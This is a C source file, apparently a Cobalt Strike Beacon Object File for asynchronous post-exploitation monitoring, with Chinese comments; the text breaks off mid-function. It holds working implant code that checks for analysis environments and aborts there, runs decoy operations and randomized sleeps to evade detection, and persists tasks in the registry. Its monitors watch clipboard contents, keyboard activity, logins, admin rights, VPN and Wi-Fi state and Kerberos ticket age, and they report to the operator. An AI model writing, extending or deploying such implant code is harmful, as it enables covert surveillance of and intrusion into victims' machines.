#include "async_bof.h"

// 函数声明
void list_tasks();
int delete_task(unsigned int task_id);

// 任务链表头
static async_task_t* task_list_head = NULL;
static unsigned int next_task_id = 1;

#ifdef BOF_BUILD
// 这些函数由Cobalt Strike在运行时提供
#else
// 用于本地测试的简单实现
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <time.h>

void BeaconPrintf(int type, char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
    printf("\n");
}

void BeaconDataParse(datap* parser, char* buffer, int size) {
    parser->original = buffer;
    parser->resolved = buffer;
}

int BeaconDataInt(datap* parser) {
    int value = *(int*)parser->resolved;
    parser->resolved += sizeof(int);
    return value;
}

short BeaconDataShort(datap* parser) {
    short value = *(short*)parser->resolved;
    parser->resolved += sizeof(short);
    return value;
}

int BeaconDataLength(datap* parser) {
    return *(int*)parser->resolved;
}

char* BeaconDataExtract(datap* parser, int* size) {
    int len = BeaconDataLength(parser);
    if (size) *size = len;
    
    char* data = parser->resolved + sizeof(int);
    parser->resolved += sizeof(int) + len;
    return data;
}

// 内存分配函数占位符
void* MSVCRT$malloc(size_t size) { return malloc(size); }
void MSVCRT$free(void* ptr) { free(ptr); }
void* MSVCRT$calloc(size_t num, size_t size) { return calloc(num, size); }
int MSVCRT$strcmp(const char* str1, const char* str2) { return strcmp(str1, str2); }
char* MSVCRT$strcpy(char* dest, const char* src) { return strcpy(dest, src); }
char* MSVCRT$strncpy(char* dest, const char* src, size_t n) { return strncpy(dest, src, n); }
size_t MSVCRT$strlen(const char* str) { return strlen(str); }
void* MSVCRT$memset(void* ptr, int value, size_t num) { return memset(ptr, value, num); }
char* MSVCRT$strstr(const char* str, const char* substr) { return strstr(str, substr); }
int MSVCRT$sprintf(char* str, const char* format, ...) {
    va_list args;
    va_start(args, format);
    int result = vsprintf(str, format, args);
    va_end(args);
    return result;
}

// Windows API函数占位符
HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID) { return GetCurrentProcess(); }
LONG WINAPI ADVAPI32$RegDeleteKeyA(HKEY hKey, LPCSTR lpSubKey) { return RegDeleteKeyA(hKey, lpSubKey); }
LONG WINAPI ADVAPI32$RegEnumKeyExA(HKEY hKey, DWORD dwIndex, LPSTR lpName, LPDWORD lpcchName, LPDWORD lpReserved, LPSTR lpClass, LPDWORD lpcchClass, PFILETIME lpftLastWriteTime) { return RegEnumKeyExA(hKey, dwIndex, lpName, lpcchName, lpReserved, lpClass, lpcchClass, lpftLastWriteTime); }
HGLOBAL WINAPI KERNEL32$GlobalLock(HGLOBAL hMem) { return GlobalLock(hMem); }
BOOL WINAPI KERNEL32$GlobalUnlock(HGLOBAL hMem) { return GlobalUnlock(hMem); }
HGLOBAL WINAPI KERNEL32$GlobalAlloc(UINT uFlags, SIZE_T dwBytes) { return GlobalAlloc(uFlags, dwBytes); }
HGLOBAL WINAPI KERNEL32$GlobalFree(HGLOBAL hMem) { return GlobalFree(hMem); }
BOOL WINAPI USER32$OpenClipboard(HWND hWndNewOwner) { return OpenClipboard(hWndNewOwner); }
BOOL WINAPI USER32$CloseClipboard(VOID) { return CloseClipboard(); }
HANDLE WINAPI USER32$GetClipboardData(UINT uFormat) { return GetClipboardData(uFormat); }
BOOL WINAPI USER32$AddClipboardFormatListener(HWND hwnd) { return AddClipboardFormatListener(hwnd); }
BOOL WINAPI USER32$GetLastInputInfo(PLASTINPUTINFO plii) { return GetLastInputInfo(plii); }
DWORD WINAPI KERNEL32$GetTickCount64(VOID) { return GetTickCount64(); }
int MSVCRT$vsprintf(char* str, const char* format, va_list args) { return vsprintf(str, format, args); }
char* MSVCRT$strncat(char* dest, const char* src, size_t n) { return strncat(dest, src, n); }
char* MSVCRT$strcat(char* dest, const char* src) { return strcat(dest, src); }
HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) { return CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId); }
DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) { return WaitForSingleObject(hHandle, dwMilliseconds); }
BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject) { return CloseHandle(hObject); }
DWORD WINAPI KERNEL32$GetCurrentThreadId(VOID) { return GetCurrentThreadId(); }
DWORD WINAPI KERNEL32$GetTickCount(VOID) { return GetTickCount(); }
DWORD WINAPI KERNEL32$Sleep(DWORD dwMilliseconds) { Sleep(dwMilliseconds); return 0; }
LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult) { return RegOpenKeyExA(hKey, lpSubKey, ulOptions, samDesired, phkResult); }
LONG WINAPI ADVAPI32$RegQueryValueExA(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData) { return RegQueryValueExA(hKey, lpValueName, lpReserved, lpType, lpData, lpcbData); }
LONG WINAPI ADVAPI32$RegSetValueExA(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData) { return RegSetValueExA(hKey, lpValueName, Reserved, dwType, lpData, cbData); }
LONG WINAPI ADVAPI32$RegCreateKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD Reserved, LPSTR lpClass, DWORD dwOptions, REGSAM samDesired, LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition) { return RegCreateKeyExA(hKey, lpSubKey, Reserved, lpClass, dwOptions, samDesired, lpSecurityAttributes, phkResult, lpdwDisposition); }
LONG WINAPI ADVAPI32$RegCloseKey(HKEY hKey) { return RegCloseKey(hKey); }
LONG WINAPI ADVAPI32$RegDeleteValueA(HKEY hKey, LPCSTR lpValueName) { return RegDeleteValueA(hKey, lpValueName); }
BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle) { return OpenProcessToken(ProcessHandle, DesiredAccess, TokenHandle); }
BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength) { return GetTokenInformation(TokenHandle, TokenInformationClass, TokenInformation, TokenInformationLength, ReturnLength); }
BOOL WINAPI ADVAPI32$LookupAccountSidA(LPCSTR lpSystemName, PSID Sid, LPSTR Name, LPDWORD cchName, LPSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse) { return LookupAccountSidA(lpSystemName, Sid, Name, cchName, ReferencedDomainName, cchReferencedDomainName, peUse); }
BOOL WINAPI ADVAPI32$AllocateAndInitializeSid(PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority, BYTE nSubAuthorityCount, DWORD nSubAuthority0, DWORD nSubAuthority1, DWORD nSubAuthority2, DWORD nSubAuthority3, DWORD nSubAuthority4, DWORD nSubAuthority5, DWORD nSubAuthority6, DWORD nSubAuthority7, PSID *pSid) { return AllocateAndInitializeSid(pIdentifierAuthority, nSubAuthorityCount, nSubAuthority0, nSubAuthority1, nSubAuthority2, nSubAuthority3, nSubAuthority4, nSubAuthority5, nSubAuthority6, nSubAuthority7, pSid); }
BOOL WINAPI ADVAPI32$EqualSid(PSID pSid1, PSID pSid2) { return EqualSid(pSid1, pSid2); }
PVOID WINAPI ADVAPI32$FreeSid(PSID pSid) { return FreeSid(pSid); }
HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID) { return CreateToolhelp32Snapshot(dwFlags, th32ProcessID); }
BOOL WINAPI KERNEL32$Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) { return Process32First(hSnapshot, lppe); }
BOOL WINAPI KERNEL32$Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) { return Process32Next(hSnapshot, lppe); }
SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess) { return OpenSCManagerA(lpMachineName, lpDatabaseName, dwDesiredAccess); }
SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess) { return OpenServiceA(hSCManager, lpServiceName, dwDesiredAccess); }
BOOL WINAPI ADVAPI32$QueryServiceStatus(SC_HANDLE hService, LPSERVICE_STATUS lpServiceStatus) { return QueryServiceStatus(hService, lpServiceStatus); }
BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE hSCObject) { return CloseServiceHandle(hSCObject); }
DWORD WINAPI IPHLPAPI$GetAdaptersInfo(PIP_ADAPTER_INFO pAdapterInfo, PULONG pOutBufLen) { return 0; }
DWORD WINAPI IPHLPAPI$GetNetworkParams(PFIXED_INFO pFixedInfo, PULONG pOutBufLen) { return 0; }

#endif

// 辅助函数
const char* get_event_name(event_type_t type) {
    switch (type) {
        case EVENT_ADMIN_LOGIN: return "Admin Login";
        case EVENT_PROCESS_START: return "Process Start";
        case EVENT_USER_LOGIN: return "User Login";
        case EVENT_NETWORK_ISOLATION: return "Network Isolation";
        case EVENT_VPN_CONNECTION: return "VPN Connection";
        case EVENT_WIFI_CONNECTION: return "WiFi Connection";
        case EVENT_TICKET_EXPIRATION: return "Ticket Expiration";
        case EVENT_CLIPBOARD_COPY: return "Clipboard Copy";
        case EVENT_KEYBOARD_INPUT: return "Keyboard Input";
        case EVENT_USER_LOGON: return "User Logon";
        default: return "Unknown";
    }
}

const char* get_task_status_name(task_status_t status) {
    switch (status) {
        case TASK_PENDING: return "Pending";
        case TASK_RUNNING: return "Running";
        case TASK_COMPLETED: return "Completed";
        case TASK_CANCELLED: return "Cancelled";
        default: return "Unknown";
    }
}

// BOF入口点
void go(char* args, int length) {
    // 执行安全检查
    if (!perform_security_check()) {
        BeaconPrintf(2, "[Async BOF] Security check failed - potential analysis environment");
        return;
    }
    
    // 执行诱饵操作
    perform_decoy_operations();
    
    datap parser;
    BeaconDataParse(&parser, args, length);
    
    int command = BeaconDataInt(&parser);
    
    switch (command) {
        case 1: { // 添加监控任务
            char* task_name = BeaconDataExtract(&parser, NULL);
            int event_type = BeaconDataInt(&parser);
            char* params = BeaconDataExtract(&parser, NULL);
            int interval = BeaconDataInt(&parser);
            
            async_task_t* task = create_task(task_name, (event_type_t)event_type, params, interval);
            if (task) {
                if (save_task(task)) {
                    task->thread_handle = KERNEL32$CreateThread(NULL, 0, task_thread_proc, task, 0, &task->thread_id);
                    if (task->thread_handle) {
                        BeaconPrintf(0, "[Async BOF] Task '%s' (ID: %d) added for event type %d with interval %d seconds", 
                                     task->name, task->task_id, task->event_type, task->interval);
                    } else {
                        BeaconPrintf(2, "[Async BOF] Failed to create thread for task '%s'", task->name);
                        destroy_task(task);
                    }
                } else {
                    BeaconPrintf(2, "[Async BOF] Failed to save task '%s' to registry", task->name);
                    destroy_task(task);
                }
            } else {
                BeaconPrintf(2, "[Async BOF] Failed to create task '%s'", task_name);
            }
            break;
        }
        case 2: { // 列出任务
            list_tasks();
            break;
        }
        case 3: { // 模拟事件触发
            int event_type = BeaconDataInt(&parser);
            char* host = BeaconDataExtract(&parser, NULL);
            BeaconPrintf(0, "[TEST EVENT] Event type %d triggered on %s", event_type, host);
            break;
        }
        case 4: { // 取消任务
            int task_id = BeaconDataInt(&parser);
            if (cancel_task(task_id)) {
                BeaconPrintf(0, "[Async BOF] Task %d cancelled successfully", task_id);
            } else {
                BeaconPrintf(2, "[Async BOF] Failed to cancel task %d", task_id);
            }
            break;
        }
        case 5: { // 删除任务
            int task_id = BeaconDataInt(&parser);
            if (delete_task(task_id)) {
                BeaconPrintf(0, "[Async BOF] Task %d deleted successfully", task_id);
            } else {
                BeaconPrintf(2, "[Async BOF] Failed to delete task %d", task_id);
            }
            break;
        }
        case 6: { // 加载任务
            int loaded_count = load_tasks();
            BeaconPrintf(0, "[Async BOF] Loaded %d tasks from registry", loaded_count);
            break;
        }
        default: {
            BeaconPrintf(2, "[Async BOF] Unknown command: %d", command);
            break;
        }
    }
}

// 检查事件是否发生
int check_event(async_task_t* task) {
    switch (task->event_type) {
        // 传统轮询模式监控
        case EVENT_ADMIN_LOGIN:
            return monitor_admin_login(task);
        case EVENT_PROCESS_START:
            return monitor_process_start(task);
        case EVENT_USER_LOGIN:
            return monitor_user_login(task);
        case EVENT_NETWORK_ISOLATION:
            return monitor_network_isolation(task);
        case EVENT_VPN_CONNECTION:
            return monitor_vpn_connection(task);
        case EVENT_WIFI_CONNECTION:
            return monitor_wifi_connection(task);
        case EVENT_TICKET_EXPIRATION:
            return monitor_ticket_expiration(task);
        case EVENT_CLIPBOARD_COPY:
            return monitor_clipboard_copy(task);
        case EVENT_KEYBOARD_INPUT:
            return monitor_keyboard_input(task);
        case EVENT_USER_LOGON:
            return monitor_user_logon(task);
            
        // 新增的真实事件监控 (需要链接real_event_monitor.c)
        case EVENT_REAL_PROCESS_CREATE:
        case EVENT_REAL_PROCESS_TERMINATE:
            return monitor_real_process_events(task);
        case EVENT_REAL_FILE_ACCESS:
            return monitor_real_file_access(task);
        case EVENT_REAL_REGISTRY_CHANGE:
            return monitor_real_registry_changes(task);
        case EVENT_REAL_NETWORK_CONNECTION:
            return monitor_real_network_events(task);
        case EVENT_REAL_LOGIN_ATTEMPT:
            return monitor_real_login_events(task);
        case EVENT_REAL_PRIVILEGE_ESCALATION:
            return monitor_real_privilege_escalation(task);
            
        default:
            // 对于未知事件类型，使用真实事件监控
            if (task->monitor_mode == MONITOR_MODE_EVENT_LOG) {
                return setup_event_log_monitoring(task);
            } else if (task->monitor_mode == MONITOR_MODE_ETW) {
                return setup_etw_monitoring(task);
            } else {
                // 默认返回0，表示无事件
                return 0;
            }
    }
}

// 监控函数实现
int monitor_admin_login(async_task_t* task) {
    HANDLE hToken = NULL;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return 0;
    }
    
    DWORD dwSize = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwSize);
    if (dwSize == 0) {
        KERNEL32$CloseHandle(hToken);
        return 0;
    }
    
    PTOKEN_GROUPS pGroupInfo = (PTOKEN_GROUPS)MSVCRT$malloc(dwSize);
    if (!pGroupInfo) {
        KERNEL32$CloseHandle(hToken);
        return 0;
    }
    
    if (!ADVAPI32$GetTokenInformation(hToken, TokenGroups, pGroupInfo, dwSize, &dwSize)) {
        MSVCRT$free(pGroupInfo);
        KERNEL32$CloseHandle(hToken);
        return 0;
    }
    
    SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY;
    PSID pAdminSid = NULL;
    if (!ADVAPI32$AllocateAndInitializeSid(&sia, 2, SECURITY_BUILTIN_DOMAIN_RID, 
                                          DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdminSid)) {
        MSVCRT$free(pGroupInfo);
        KERNEL32$CloseHandle(hToken);
        return 0;
    }
    
    int isAdmin = 0;
    for (DWORD i = 0; i < pGroupInfo->GroupCount; i++) {
        if (ADVAPI32$EqualSid(pAdminSid, pGroupInfo->Groups[i].Sid)) {
            isAdmin = 1;
            break;
        }
    }
    
    ADVAPI32$FreeSid(pAdminSid);
    MSVCRT$free(pGroupInfo);
    KERNEL32$CloseHandle(hToken);
    
    return isAdmin;
}

int monitor_process_start(async_task_t* task) {
    // 改进的进程监控：检查新启动的进程
    static DWORD last_check_time = 0;
    static DWORD last_process_count = 0;
    
    DWORD current_time = KERNEL32$GetTickCount();
    
    // 为了提高效率，不是每次都检查
    if (current_time - last_check_time < 5000) { // 5秒间隔
        return 0;
    }
    
    HANDLE hSnapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    DWORD process_count = 0;
    int found_target = 0;
    
    if (KERNEL32$Process32First(hSnapshot, &pe32)) {
        do {
            process_count++;
            // 检查是否是目标进程
            if (MSVCRT$strstr(pe32.szExeFile, task->params) != NULL) {
                // 还可以检查进程创建时间是否近期
                found_target = 1;
            }
        } while (KERNEL32$Process32Next(hSnapshot, &pe32));
    }
    
    KERNEL32$CloseHandle(hSnapshot);
    
    // 检查进程数量是否增加（可能有新进程启动）
    int process_activity = 0;
    if (last_process_count > 0 && process_count > last_process_count) {
        process_activity = 1;
    }
    
    last_check_time = current_time;
    last_process_count = process_count;
    
    // 如果找到目标进程或者有新进程活动
    return found_target || (process_activity && MSVCRT$strlen(task->params) == 0);
}

int monitor_user_login(async_task_t* task) {
    HANDLE hToken = NULL;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        return 0;
    }
    
    DWORD dwSize = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
    if (dwSize == 0) {
        KERNEL32$CloseHandle(hToken);
        return 0;
    }
    
    PTOKEN_USER pUserInfo = (PTOKEN_USER)MSVCRT$malloc(dwSize);
    if (!pUserInfo) {
        KERNEL32$CloseHandle(hToken);
        return 0;
    }
    
    if (!ADVAPI32$GetTokenInformation(hToken, TokenUser, pUserInfo, dwSize, &dwSize)) {
        MSVCRT$free(pUserInfo);
        KERNEL32$CloseHandle(hToken);
        return 0;
    }
    
    char username[256];
    char domain[256];
    DWORD userSize = sizeof(username);
    DWORD domainSize = sizeof(domain);
    SID_NAME_USE sidType;
    
    if (ADVAPI32$LookupAccountSidA(NULL, pUserInfo->User.Sid, username, &userSize, domain, &domainSize, &sidType)) {
        if (MSVCRT$strcmp(username, task->params) == 0) {
            MSVCRT$free(pUserInfo);
            KERNEL32$CloseHandle(hToken);
            return 1;
        }
    }
    
    MSVCRT$free(pUserInfo);
    KERNEL32$CloseHandle(hToken);
    return 0;
}

int monitor_network_isolation(async_task_t* task) {
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)MSVCRT$malloc(ulOutBufLen);
    if (!pAdapterInfo) {
        return 0;
    }
    
    DWORD dwRetVal = IPHLPAPI$GetAdaptersInfo(pAdapterInfo, &ulOutBufLen);
    
    if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
        MSVCRT$free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)MSVCRT$malloc(ulOutBufLen);
        if (!pAdapterInfo) {
            return 0;
        }
        dwRetVal = IPHLPAPI$GetAdaptersInfo(pAdapterInfo, &ulOutBufLen);
    }
    
    if (dwRetVal != NO_ERROR) {
        MSVCRT$free(pAdapterInfo);
        return 0;
    }
    
    int isConnected = 0;
    PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
    while (pAdapter) {
        if (pAdapter->IpAddressList.IpAddress.String[0] != '\0' && 
            pAdapter->Type != MIB_IF_TYPE_LOOPBACK) {
            isConnected = 1;
            break;
        }
        pAdapter = pAdapter->Next;
    }
    
    MSVCRT$free(pAdapterInfo);
    
    static int wasConnected = 1;
    if (wasConnected && !isConnected) {
        wasConnected = isConnected;
        return 1;
    }
    
    wasConnected = isConnected;
    return 0;
}

int monitor_vpn_connection(async_task_t* task) {
    SC_HANDLE hSCManager = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCManager) {
        return 0;
    }
    
    const char* vpn_services[] = {"RasMan", "VpnService", "OpenVPN", "WireGuard"};
    int service_count = sizeof(vpn_services) / sizeof(vpn_services[0]);
    
    for (int i = 0; i < service_count; i++) {
        SC_HANDLE hService = ADVAPI32$OpenServiceA(hSCManager, vpn_services[i], SERVICE_QUERY_STATUS);
        if (hService) {
            SERVICE_STATUS status;
            if (ADVAPI32$QueryServiceStatus(hService, &status)) {
                if (status.dwCurrentState == SERVICE_RUNNING) {
                    ADVAPI32$CloseServiceHandle(hService);
                    ADVAPI32$CloseServiceHandle(hSCManager);
                    return 1;
                }
            }
            ADVAPI32$CloseServiceHandle(hService);
        }
    }
    
    ADVAPI32$CloseServiceHandle(hSCManager);
    return 0;
}

int monitor_wifi_connection(async_task_t* task) {
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)MSVCRT$malloc(ulOutBufLen);
    if (!pAdapterInfo) {
        return 0;
    }
    
    DWORD dwRetVal = IPHLPAPI$GetAdaptersInfo(pAdapterInfo, &ulOutBufLen);
    
    if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
        MSVCRT$free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)MSVCRT$malloc(ulOutBufLen);
        if (!pAdapterInfo) {
            return 0;
        }
        dwRetVal = IPHLPAPI$GetAdaptersInfo(pAdapterInfo, &ulOutBufLen);
    }
    
    if (dwRetVal != NO_ERROR) {
        MSVCRT$free(pAdapterInfo);
        return 0;
    }
    
    PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
    while (pAdapter) {
        if (pAdapter->Type == IF_TYPE_IEEE80211 && 
            pAdapter->IpAddressList.IpAddress.String[0] != '\0') {
            if (MSVCRT$strlen(task->params) == 0 || 
                MSVCRT$strstr(pAdapter->Description, task->params) != NULL) {
                MSVCRT$free(pAdapterInfo);
                return 1;
            }
        }
        pAdapter = pAdapter->Next;
    }
    
    MSVCRT$free(pAdapterInfo);
    return 0;
}

int monitor_ticket_expiration(async_task_t* task) {
    // 实际检查Kerberos票据过期时间
    unsigned int warning_minutes = 60; // 默认60分钟警告
    if (MSVCRT$strlen(task->params) > 0) {
        warning_minutes = 0;
        for (int i = 0; task->params[i] != '\0'; i++) {
            if (task->params[i] >= '0' && task->params[i] <= '9') {
                warning_minutes = warning_minutes * 10 + (task->params[i] - '0');
            }
        }
        if (warning_minutes == 0) warning_minutes = 60;
    }
    
    // 尝试获取当前用户的票据信息
    HANDLE hToken;
    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        DWORD dwSize = 0;
        ADVAPI32$GetTokenInformation(hToken, TokenStatistics, NULL, 0, &dwSize);
        
        if (dwSize > 0) {
            PTOKEN_STATISTICS pStats = (PTOKEN_STATISTICS)MSVCRT$malloc(dwSize);
            if (pStats && ADVAPI32$GetTokenInformation(hToken, TokenStatistics, pStats, dwSize, &dwSize)) {
                // 计算票据剩余时间（简化实现）
                ULONGLONG current_time = KERNEL32$GetTickCount64() / 1000; // 秒
                ULONGLONG token_age = current_time - (pStats->AuthenticationId.LowPart / 10000000);
                
                // 假设票据有效期为10小时（36000秒）
                if (token_age > (36000 - warning_minutes * 60)) {
                    MSVCRT$free(pStats);
                    KERNEL32$CloseHandle(hToken);
                    return 1;
                }
            }
            if (pStats) MSVCRT$free(pStats);
        }
        KERNEL32$CloseHandle(hToken);
    }
    
    return 0;
}

int monitor_clipboard_copy(async_task_t* task) {
    static char last_clipboard_content[1024] = {0};
    
    if (!USER32$OpenClipboard(NULL)) {
        return 0;
    }
    
    HANDLE hData = USER32$GetClipboardData(CF_TEXT);
    if (hData) {
        char* data = (char*)KERNEL32$GlobalLock(hData);
        if (data) {
            if (MSVCRT$strcmp(data, last_clipboard_content) != 0) {
                MSVCRT$strncpy(last_clipboard_content, data, sizeof(last_clipboard_content) - 1);
                last_clipboard_content[sizeof(last_clipboard_content) - 1] = '\0';
                
                if (MSVCRT$strstr(data, task->params) != NULL) {
                    KERNEL32$GlobalUnlock(hData);
                    USER32$CloseClipboard();
                    return 1;
                }
            }
            KERNEL32$GlobalUnlock(hData);
        }
    }
    
    USER32$CloseClipboard();
    return 0;
}

int monitor_keyboard_input(async_task_t* task) {
    // 监控特定的键盘输入模式或窗口
    static DWORD last_input_time = 0;
    DWORD current_time = KERNEL32$GetTickCount();
    
    // 检查系统空闲时间
    LASTINPUTINFO lii = {0};
    lii.cbSize = sizeof(LASTINPUTINFO);
    
    if (USER32$GetLastInputInfo(&lii)) {
        DWORD idle_time = current_time - lii.dwTime;
        
        // 如果有新的输入活动
        if (last_input_time == 0 || lii.dwTime > last_input_time) {
            last_input_time = lii.dwTime;
            
            // 检查是否匹配监控条件
            if (MSVCRT$strlen(task->params) == 0 || idle_time < 5000) { // 5秒内的活动
                return 1;
            }
        }
    }
    
    return 0;
}

int monitor_user_logon(async_task_t* task) {
    return monitor_user_login(task);
}

// 任务管理函数
void report_event(async_task_t* task) {
    switch (task->event_type) {
        case EVENT_ADMIN_LOGIN:
            BeaconPrintf(0, "[EVENT] Administrator privileges detected on %s", task->params);
            break;
        case EVENT_PROCESS_START:
            BeaconPrintf(0, "[EVENT] Process '%s' started on %s", task->params, task->name);
            break;
        case EVENT_USER_LOGIN:
            BeaconPrintf(0, "[EVENT] User '%s' login detected on %s", task->params, task->name);
            break;
        case EVENT_NETWORK_ISOLATION:
            BeaconPrintf(0, "[EVENT] Network isolation detected on %s", task->params);
            break;
        case EVENT_VPN_CONNECTION:
            BeaconPrintf(0, "[EVENT] VPN connection detected: %s", task->params);
            break;
        case EVENT_WIFI_CONNECTION:
            BeaconPrintf(0, "[EVENT] WiFi connection detected: %s", task->params);
            break;
        case EVENT_TICKET_EXPIRATION:
            BeaconPrintf(0, "[EVENT] Ticket expiration warning: %s minutes remaining", task->params);
            break;
        case EVENT_CLIPBOARD_COPY:
            BeaconPrintf(0, "[EVENT] Clipboard copy detected: '%s'", task->params);
            break;
        case EVENT_KEYBOARD_INPUT:
            BeaconPrintf(0, "[EVENT] Keyboard input detected: '%s'", task->params);
            break;
        case EVENT_USER_LOGON:
            BeaconPrintf(0, "[EVENT] User logon detected: '%s'", task->params);
            break;
        default:
            BeaconPrintf(0, "[EVENT] Unknown event type %d on %s", task->event_type, task->params);
            break;
    }
}

async_task_t* create_task(const char* name, event_type_t type, const char* params, unsigned int interval) {
    // 验证参数
    if (!validate_task_params(name, type, params)) {
        return NULL;
    }
    
    async_task_t* task = (async_task_t*)safe_malloc(sizeof(async_task_t));
    if (!task) {
        return NULL;
    }
    
    // 初始化任务结构
    if (!safe_strcpy(task->name, sizeof(task->name), name)) {
        safe_free(task);
        return NULL;
    }
    
    task->status = TASK_PENDING;
    task->event_type = type;
    task->monitor_mode = MONITOR_MODE_POLLING; // 默认模式
    
    if (!safe_strcpy(task->params, sizeof(task->params), params)) {
        safe_free(task);
        return NULL;
    }
    
    task->interval = interval > 0 ? interval : 30; // 默认30秒
    task->last_check = 0;
    task->task_id = next_task_id++;
    task->thread_handle = NULL;
    task->thread_id = 0;
    task->next = NULL;
    
    // 初始化事件监控相关字段
    task->event_log_handle = NULL;
    task->etw_session_handle = NULL;
    task->event_subscription = NULL;
    task->events_detected = 0;
    task->false_positives = 0;
    task->start_time = KERNEL32$GetTickCount64();
    
    LOG_INFO("Created task '%s' (ID: %d, type: %d, interval: %d)", 
             task->name, task->task_id, task->event_type, task->interval);
    
    return task;
}

void destroy_task(async_task_t* task) {
    if (!task) {
        LOG_WARNING("Attempt to destroy NULL task");
        return;
    }
    
    LOG_INFO("Destroying task '%s' (ID: %d)", task->name, task->task_id);
    
    // 清理线程资源
    if (task->thread_handle) {
        LOG_DEBUG("Closing thread handle for task %d", task->task_id);
        if (!KERNEL32$CloseHandle(task->thread_handle)) {
            LOG_ERROR("Failed to close thread handle for task %d", task->task_id);
        }
        task->thread_handle = NULL;
    }
    
    // 清理事件监控资源
    cleanup_event_monitoring(task);
    
    // 释放内存
    safe_free(task);
}

DWORD WINAPI task_thread_proc(LPVOID param) {
    async_task_t* task = (async_task_t*)param;
    task->status = TASK_RUNNING;
    
    if (task_list_head == NULL) {
        task_list_head = task;
    } else {
        async_task_t* current = task_list_head;
        while (current->next != NULL) {
            current = current->next;
        }
        current->next = task;
    }
    
    while (task->status != TASK_CANCELLED) {
        // 使用随机化的监控间隔
        unsigned int randomized_interval = get_randomized_interval(task->interval);
        DWORD sleep_time = randomized_interval * 1000;
        
        LOG_DEBUG("Task %d sleeping for %lu ms (original: %u ms)", 
                 task->task_id, sleep_time, task->interval * 1000);
        
        KERNEL32$Sleep(sleep_time);
        
        // 执行诱饵操作
        perform_decoy_operations();
        
        if (check_event(task)) {
            report_event(task);
            task->status = TASK_COMPLETED;
            break;
        }
        
        task->last_check = KERNEL32$GetTickCount() / 1000;
    }
    
    return 0;
}

int save_task(async_task_t* task) {
    HKEY hKey;
    char subkey[256];
    DWORD disposition;
    
    safe_sprintf(subkey, sizeof(subkey), "Software\\AsyncBOF\\Tasks\\%d", task->task_id);
    LONG result = ADVAPI32$RegCreateKeyExA(
        HKEY_CURRENT_USER,
        subkey,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        &disposition
    );
    
    if (result != ERROR_SUCCESS) {
        return 0;
    }
    
    result = ADVAPI32$RegSetValueExA(hKey, "Name", 0, REG_SZ, (const BYTE*)task->name, MSVCRT$strlen(task->name) + 1);
    if (result != ERROR_SUCCESS) {
        ADVAPI32$RegCloseKey(hKey);
        return 0;
    }
    
    DWORD event_type = task->event_type;
    result = ADVAPI32$RegSetValueExA(hKey, "EventType", 0, REG_DWORD, (const BYTE*)&event_type, sizeof(DWORD));
    if (result != ERROR_SUCCESS) {
